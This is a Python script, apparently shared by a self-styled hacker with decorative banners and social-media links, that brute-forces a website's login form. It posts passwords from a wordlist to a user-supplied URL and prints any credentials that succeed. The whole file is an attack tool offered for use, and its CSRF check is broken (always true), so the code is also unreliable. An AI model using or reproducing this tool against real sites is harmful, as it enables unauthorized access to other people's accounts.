######################################################################################################
# create by heart hacker Alex.                                                       #                                      
# Instagram ID-)( https://instagram.com/heart_hanter_alex?igshid=MzNlNGNkZWQ4Mg==                      #                                                     
# Facebook account-)(https://www.facebook.com/profile.php?id=100068796847132&mibextid=ZbWKwL     #
# GitHub account -)(https://github.com/HeartHaNterAlex                              #
######################################################################################################
RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m' 
CYAN = "\033[36m"
END = "\033[0m"

banner = f"""
{GREEN}

    ____             _____             __   __  __      _   ____               
   / __ \____ ______/ ___/      ______/ /  / / / /___ _/ | / / /____  _____    
  / /_/ / __ `/ ___/\__ \ | /| / / __  /  / /_/ / __ `/  |/ / __/ _ \/ ___/    
 / ____/ /_/ (__  )___/ / |/ |/ / /_/ /  / __  / /_/ / /|  / /_/  __/ /        
/_/    \__,_/____//____/|__/|__/\__,_/  /_/ /_/\__,_/_/ |_/\__/\___/_/         
   
{RED}
    ⠀⠀／⌒ヽ
 　　/° ω°      ℂ𝕣𝕒t𝕖-𝔹𝕐
 ＿ノ ヽ　ノ ＼＿ ℍ𝕖𝕒𝕣𝕥-ℍ𝕒𝕟𝕥𝕖𝕣-𝔸̄𝕝𝕖̄𝕩
‘/     / ⌒Ｙ⌒ Ｙ　ヽ
( 　(三ヽ人　 /　　  |𝕚𝕟𝕤𝕥𝕒𝕘𝕣𝕒𝕞-𝕚𝔻
|　ﾉ⌒＼ ￣￣ヽ　 ノ
ヽ＿＿＿＞､＿＿／𝕙𝕖𝕒𝕣𝕥 𝕙𝕒𝕟𝕥𝕖𝕣 𝕒𝕝𝕖𝕩
 　 ｜( 王 ﾉ〈
 　 /ﾐ`ー―彡ヽ𝔽𝕒𝕔𝕖𝔹𝕠𝕠𝕜-𝕚𝔻
 　/　ヽ／　 |𝔸̈𝕝𝕖̄𝕩
                                                                                                                 
{CYAN}
"""

print(banner)

import threading
import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.10)

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

def main():
    url = input("Enter Your Url: ")
    username = input("Enter Your Username: ")
    error = input("Enter  Password Character No: ")
    cracker = BruteForceCracker(url, username, error)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """  
               ( --Tool Create by HeartHaNterAlex-- )
        ☠︎︎-[➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪➪]-☠︎︎
           (--PassWord CracKer--)(--control +Z (--Exit--)
"""
    print(banner)
    main()
